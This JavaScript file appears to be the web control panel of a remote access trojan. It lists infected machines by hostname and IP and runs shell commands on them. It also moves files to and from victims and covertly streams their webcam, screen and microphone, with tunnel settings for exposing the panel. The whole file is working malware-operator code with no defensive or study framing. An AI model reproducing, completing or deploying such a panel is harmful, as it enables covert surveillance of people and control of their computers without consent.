const socket = io();
let sessions = [];
let selectedId = null;
let camInterval = null;
let scrInterval = null;
let audInterval = null;

const listEl = document.getElementById('session-list');
const filterIn = document.getElementById('filter-input');
const connCountEl = document.getElementById('conn-count');
const leftStatus = document.getElementById('left-status');
const sessionLabel = document.getElementById('session-label');
const footerCount = document.getElementById('footer-count');

function serializeSessions(){
  return sessions.map(s=>({client_id:s.client_id,hostname:s.hostname,ip:s.ip,port:s.port,status:s.status}));
}

function renderSessions(){
  const flt = (filterIn.value||'').toLowerCase();
  listEl.innerHTML='';
  const visible = sessions.filter(s=> !flt || s.hostname.toLowerCase().includes(flt) || s.ip.includes(flt));
  visible.forEach(s=>{
    const div=document.createElement('div');
    div.className='session-item'+(s.client_id===selectedId?' active':'');
    const icon = s.status==='ONLINE'?'●':s.status==='IDLE'?'◉':'○';
    div.textContent=` ${icon} ${s.hostname} ${s.ip}:${s.port}`;
    div.onclick=()=>selectSession(s.client_id);
    listEl.appendChild(div);
  });
  connCountEl.textContent = sessions.length;
  footerCount.textContent = sessions.length;
  const online = sessions.filter(s=>s.status==='ONLINE').length;
  leftStatus.textContent = `● ${sessions.length} clients  |  ${online} online`;
}

function selectSession(id){
  selectedId=id;
  const s=sessions.find(x=>x.client_id===id);
  if(s){
    sessionLabel.textContent=`◈ ${s.hostname}  |  ${s.ip}:${s.port}  |  ${s.status}`;
    sessionLabel.style.color = s.status==='ONLINE'?'#00e5ff':'#ffd166';
    // Update camera status ready
    if(document.getElementById('cam-status')) document.getElementById('cam-status').textContent = `READY — ${s.hostname}`;
  } else {
    if(document.getElementById('cam-status')) document.getElementById('cam-status').textContent = 'IDLE';
  }
  renderSessions();
}

socket.on('connect',()=>socket.emit('get_sessions'));
socket.on('sessions', data=>{
  sessions=data.map(d=>({...d}));
  if(!selectedId && sessions.length) selectSession(sessions[0].client_id);
  else renderSessions();
});

// Tabs
document.querySelectorAll('.tab').forEach(btn=>{
  btn.onclick=()=>{
    document.querySelectorAll('.tab').forEach(b=>b.classList.remove('active'));
    document.querySelectorAll('.tab-pane').forEach(p=>p.classList.remove('active'));
    btn.classList.add('active');
    document.getElementById(btn.dataset.tab).classList.add('active');
  };
});

// Clock
setInterval(()=>{
  const now=new Date().toISOString().replace('T',' ').slice(0,19);
  document.getElementById('clock').textContent=now;
},1000);

// Filter
filterIn.addEventListener('input', renderSessions);

// Delete
document.getElementById('delete-btn').onclick=()=>{
  if(!selectedId) return;
  // For demo, just remove from local list. Real delete would need backend endpoint.
  sessions = sessions.filter(s=>s.client_id!==selectedId);
  selectedId=null;
  sessionLabel.textContent='[ No session selected — click a client ]';
  socket.emit('get_sessions');
  renderSessions();
};

// Terminal
const termOut = document.getElementById('term-output');
const termCmd = document.getElementById('term-cmd');
const termPrompt = document.getElementById('term-prompt');
let termHistory=[]; let termHistIdx=-1;
document.getElementById('term-send').onclick=sendCmd;
document.getElementById('term-clear').onclick=()=>{ termOut.innerHTML=''; termHistory=[]; termHistIdx=-1; };
termCmd.addEventListener('keydown', e=>{
  if(e.key==='Enter'){ sendCmd(); }
  else if(e.key==='ArrowUp'){ if(termHistIdx>-1){ termHistIdx--; termCmd.value=termHistory[termHistIdx]||''; } e.preventDefault(); }
  else if(e.key==='ArrowDown'){ if(termHistIdx<termHistory.length-1){ termHistIdx++; termCmd.value=termHistory[termHistIdx]||''; } else { termHistIdx=termHistory.length; termCmd.value=''; } e.preventDefault(); }
});
function sendCmd(){
  const cmd = termCmd.value.trim();
  if(!cmd || !selectedId) return;
  termHistory.push(cmd); termHistIdx=termHistory.length;
  const ts=new Date().toLocaleTimeString();
  termOut.innerHTML += `<span style="color:#1e4d29">[${ts}]</span> <span style="color:#00ffe5">$ ${cmd}</span><br>`;
  socket.emit('command',{client_id:selectedId,command:cmd});
  termCmd.value='';
}
socket.on('command_result', d=>{
  if(d.error){ termOut.innerHTML += `<span style="color:#ff3333">Error: ${d.error}</span><br>`; return; }
  const out = d.output || {};
  const stdout = out.stdout||'';
  const stderr = out.stderr||'';
  const cwd = out.cwd||'';
  if(cwd){ termPrompt.textContent = cwd+'> '; }
  if(stdout){ termOut.innerHTML += `<span style="color:#00ff41">${escapeHtml(stdout)}</span>`; }
  if(stderr){ termOut.innerHTML += `<span style="color:#ff3333">${escapeHtml(stderr)}</span>`; }
  termOut.scrollTop = termOut.scrollHeight;
});
function escapeHtml(s){ return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }

// Sysinfo
document.querySelector('[data-tab="sysinfo"]').addEventListener('click',()=>{
  if(selectedId){ socket.emit('get_system_info',{client_id:selectedId}); }
});
socket.on('system_info', d=>{
  document.getElementById('sysinfo-output').textContent = JSON.stringify(d.info,null,2);
});

// Files
const fileLog = document.getElementById('file-log');
function fileLogAppend(msg, tag='info'){
  const ts=new Date().toLocaleTimeString();
  fileLog.textContent += `[${ts}] ${msg}\n`;
  fileLog.scrollTop = fileLog.scrollHeight;
}

// File upload/download
document.getElementById('up-send').onclick=async ()=>{
  if(!selectedId) return;
  const fileInput = document.getElementById('up-file');
  const file = fileInput.files[0];
  if(!file){ fileLogAppend('No file selected','error'); return; }
  const remote = document.getElementById('up-remote').value;
  fileLogAppend(`Uploading ${file.name} -> ${remote}`);
  const buf = await file.arrayBuffer();
  const b64 = btoa(String.fromCharCode(...new Uint8Array(buf)));
  socket.emit('file_upload',{client_id:selectedId, remote_path:remote, filename:file.name, data:b64});
};
document.getElementById('down-send').onclick=()=>{
  if(!selectedId) return;
  const remote = document.getElementById('down-remote').value;
  if(!remote){ fileLogAppend('Remote path empty'); return; }
  fileLogAppend(`Downloading ${remote}`);
  socket.emit('file_download',{client_id:selectedId, remote_path:remote});
};
socket.on('file_upload_result', d=>{
  if(d.error) fileLogAppend('Upload error: '+d.error,'error');
  else fileLogAppend(d.ok?'Upload completed successfully':'Upload failed','success');
});
socket.on('file_download_result', d=>{
  if(d.error){ fileLogAppend('Download error: '+d.error,'error'); return; }
  if(d.ok){
    const a=document.createElement('a');
    a.href='data:application/octet-stream;base64,'+d.data;
    a.download=d.filename||'download';
    a.click();
    fileLogAppend('Download completed: '+d.filename,'success');
  } else fileLogAppend('Download failed','error');
});

// Camera
let camRunning=false;
function updateCamStatus(txt){ const el=document.getElementById('cam-status'); if(el) el.textContent=txt; }
document.getElementById('cam-start').onclick=()=>{
  if(!selectedId) return;
  camRunning=true;
  updateCamStatus('● LIVE');
  pollCam();
};
document.getElementById('cam-stop').onclick=()=>{
  camRunning=false;
  updateCamStatus('■ STOPPED');
  document.getElementById('cam-img').src='';
  document.getElementById('cam-placeholder').style.display='flex';
};
document.getElementById('cam-snap').onclick=()=>{
  if(!selectedId) return;
  updateCamStatus('● SNAP…');
  socket.emit('get_camera_frame',{client_id:selectedId});
  // Auto-download after frame arrives
  setTimeout(()=>{
    const img = document.getElementById('cam-img').src;
    if(img && img.startsWith('data:image')){
      const a=document.createElement('a');
      a.href=img;
      a.download='cam_'+selectedId+'_'+new Date().toISOString().slice(0,19).replace(/[:T]/g,'_')+'.jpg';
      a.click();
    }
    updateCamStatus(camRunning?'● LIVE':'■ STOPPED');
  },800);
};
function pollCam(){
  if(!camRunning || !selectedId) return;
  socket.emit('get_camera_frame',{client_id:selectedId});
  setTimeout(pollCam,150);
}
socket.on('camera_frame', d=>{
  if(d.error){ updateCamStatus('✗ ERROR'); return; }
  if(d.data){
    document.getElementById('cam-img').src = 'data:image/jpeg;base64,'+d.data;
    document.getElementById('cam-placeholder').style.display='none';
  }
});
// Reset camera on session change
const _oldSelect=selectSession;
selectSession=(id)=>{
  camRunning=false;
  updateCamStatus('IDLE');
  document.getElementById('cam-img').src='';
  document.getElementById('cam-placeholder').style.display='flex';
  _oldSelect(id);
};

// Screenshot
let scrLive=false;
const scrQuality = document.getElementById('scr-quality');
const scrScale = document.getElementById('scr-scale');
scrQuality.oninput=()=>document.getElementById('scr-quality-val').textContent=scrQuality.value;
scrScale.oninput=()=>document.getElementById('scr-scale-val').textContent=(scrScale.value/100).toFixed(2);
document.getElementById('scr-capture').onclick=()=>{
  if(!selectedId) return;
  document.getElementById('scr-status').textContent='● CAPTURING…';
  socket.emit('screenshot',{client_id:selectedId});
};
document.getElementById('scr-live').onclick=()=>{
  scrLive=!scrLive;
  if(scrLive){ document.getElementById('scr-live').textContent='■ STOP LIVE'; document.getElementById('scr-status').textContent='● LIVE'; pollScr(); }
  else { document.getElementById('scr-live').textContent='▶ LIVE'; document.getElementById('scr-status').textContent='■ STOPPED'; }
};
function pollScr(){
  if(!scrLive) return;
  socket.emit('screen_frame',{client_id:selectedId,quality:parseInt(scrQuality.value),scale:parseFloat(scrScale.value)/100});
  setTimeout(pollScr, 333);
}
socket.on('screenshot_result', d=>{
  if(d.error) return;
  if(d.data){ document.getElementById('scr-img').src='data:image/jpeg;base64,'+d.data; document.getElementById('scr-placeholder').style.display='none'; document.getElementById('scr-status').textContent='✓ OK'; document.getElementById('scr-ts').textContent='Captured '+new Date().toLocaleTimeString(); }
});
socket.on('screen_frame_result', d=>{
  if(d.error) return;
  if(d.data){ document.getElementById('scr-img').src='data:image/jpeg;base64,'+d.data; document.getElementById('scr-placeholder').style.display='none'; }
});
document.getElementById('scr-save').onclick=()=>{
  const img=document.getElementById('scr-img').src;
  if(!img) return;
  const a=document.createElement('a');
  a.href=img; a.download='screenshot_'+new Date().toISOString().slice(0,19).replace(/[:T]/g,'_')+'.jpg';
  a.click();
};
socket.on('screen_frame_result', d=>{
  if(d.error) return;
  if(d.data){ document.getElementById('scr-img').src='data:image/jpeg;base64,'+d.data; document.getElementById('scr-placeholder').style.display='none'; }
});

// Audio
const audLog = document.getElementById('aud-log');
function audAppend(msg){ audLog.textContent += `[${new Date().toLocaleTimeString()}] ${msg}\n`; audLog.scrollTop=audLog.scrollHeight; }
document.getElementById('aud-listen').onclick=()=>{
  if(!selectedId) return;
  socket.emit('start_audio',{client_id:selectedId});
  document.getElementById('aud-status').textContent='● LIVE';
  audAppend('Audio stream started');
  pollAudio();
};
document.getElementById('aud-stop').onclick=()=>{
  socket.emit('stop_audio',{client_id:selectedId});
  document.getElementById('aud-status').textContent='■ STOPPED';
  audAppend('Audio stopped');
};
document.getElementById('aud-record').onclick=()=>{
  if(!selectedId) return;
  socket.emit('start_audio_record',{client_id:selectedId});
  audAppend('Recording started');
};
function pollAudio(){
  if(document.getElementById('aud-status').textContent!=='● LIVE') return;
  socket.emit('get_audio_chunk',{client_id:selectedId});
  setTimeout(pollAudio,150);
}
socket.on('audio_started', d=>audAppend('Audio started'));
socket.on('audio_stopped', d=>audAppend('Audio stopped'));
socket.on('audio_chunk', d=>{ /* In browser we can't play raw PCM easily; placeholder */ });
socket.on('audio_record_started', d=>audAppend('Record started'));
socket.on('audio_record_result', d=>audAppend('Recording saved'));

// Protocols & Tunnels modals
const modalProto = document.getElementById('modal-protocol');
const modalTunnel = document.getElementById('modal-tunnel');
document.getElementById('btn-protocol').onclick=()=>{ modalProto.classList.remove('hidden'); };
document.getElementById('btn-tunnel').onclick=()=>{ modalTunnel.classList.remove('hidden'); };
document.getElementById('proto-cancel').onclick=()=>{ modalProto.classList.add('hidden'); };
document.getElementById('tunnel-cancel').onclick=()=>{ modalTunnel.classList.add('hidden'); };
document.getElementById('proto-apply').onclick=()=>{
  const val = document.querySelector('input[name="proto"]:checked').value;
  socket.emit('set_protocol',{protocol:val});
  modalProto.classList.add('hidden');
};
document.getElementById('tunnel-apply').onclick=()=>{
  const val = document.querySelector('input[name="tunnel"]:checked').value;
  socket.emit('start_tunnel',{proxy:val});
  modalTunnel.classList.add('hidden');
};
socket.on('protocol_changed', d=>{
  if(d.error) alert('Protocol error: '+d.error);
  else alert('Protocolo cambiado a '+d.protocol);
});
socket.on('bottom_update', d=>{
  document.getElementById('bottom-left').textContent = d.text;
});
socket.on('tunnel_url', d=>{ 
  const log = document.getElementById('tunnel-log');
  if(log){ log.textContent += `\n[INFO] Túnel listo: ${d.url}`; }
});
socket.on('tunnel_error', d=>{ 
  const log = document.getElementById('tunnel-log');
  if(log){ log.textContent += `\n[ERROR] ${d.error}`; }
});
socket.on('tunnel_log', d=>{
  const log = document.getElementById('tunnel-log');
  if(log){ log.textContent += `\n${d.line}`; log.scrollTop = log.scrollHeight; }
});

// Connections log initialized
